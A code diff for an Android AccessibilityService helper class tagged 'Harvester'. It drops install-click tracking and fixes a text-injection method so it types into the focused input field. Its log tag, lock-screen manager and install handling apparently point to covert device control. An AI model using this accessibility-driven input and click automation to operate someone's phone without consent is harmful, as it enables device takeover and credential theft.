@@ -15,15 +15,6 @@ import java.io.File
 class InputHelper(private val service: AccessibilityService) {
     companion object {
         private const val TAG = "Harvester"
-        private var installClicked = false
-        private var installStartTime = 0L
-        private var installAttempts = 0
-
-        fun resetInstallState() {
-            installClicked = false
-            installStartTime = 0L
-            installAttempts = 0
-        }
     }
 
     private var keyguardManager: KeyguardManager =
@@ -306,12 +297,15 @@ class InputHelper(private val service: AccessibilityService) {
     }
 
     fun inputText(text: String) {
-        val root = service.rootInActiveWindow ?: return
-        val focused = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT) ?: return
-        val args = android.os.Bundle()
-        args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
-        focused.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT)
-        Log.d(TAG, "Input text: $text")
+        try {
+            val root = service.rootInActiveWindow ?: return
+            val focused = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT) ?: return
+            val args = android.os.Bundle()
+            args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
+            focused.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
+            root.recycle()
+            Log.d(TAG, "Input text: $text")
+        } catch (_: Exception) {}
     }
 
     fun click(x: Int, y: Int) {
